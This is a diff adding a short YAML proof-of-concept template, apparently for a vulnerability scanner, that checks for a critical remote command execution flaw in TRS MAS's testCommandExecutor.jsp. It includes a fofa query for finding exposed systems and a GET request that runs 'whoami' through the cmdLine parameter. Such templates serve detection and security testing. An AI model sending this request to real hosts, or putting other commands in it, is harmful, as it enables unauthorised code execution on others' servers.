@@ -1,0 +1,15 @@
+id: poc-yaml-trs-mas-testcommandexecutor-jsp-rce
+info:
+  name: 拓尔思 MAS testCommandExecutor.jsp 远程命令执行漏洞
+  severity: critical
+  tags:
+  - rce
+  - 两高一弱
+  finger: TRS-MAS
+  fofa: app="TRS-MAS"
+requests:
+- method: GET
+  path: /mas/sysinfo/testCommandExecutor.jsp?cmdLine=whoami&workDir=&pathEnv=&libPathEnv=
+  expression: status_code == 200 && contains(body,"测试命令行进程执行")
+variables: {}
+transport: http
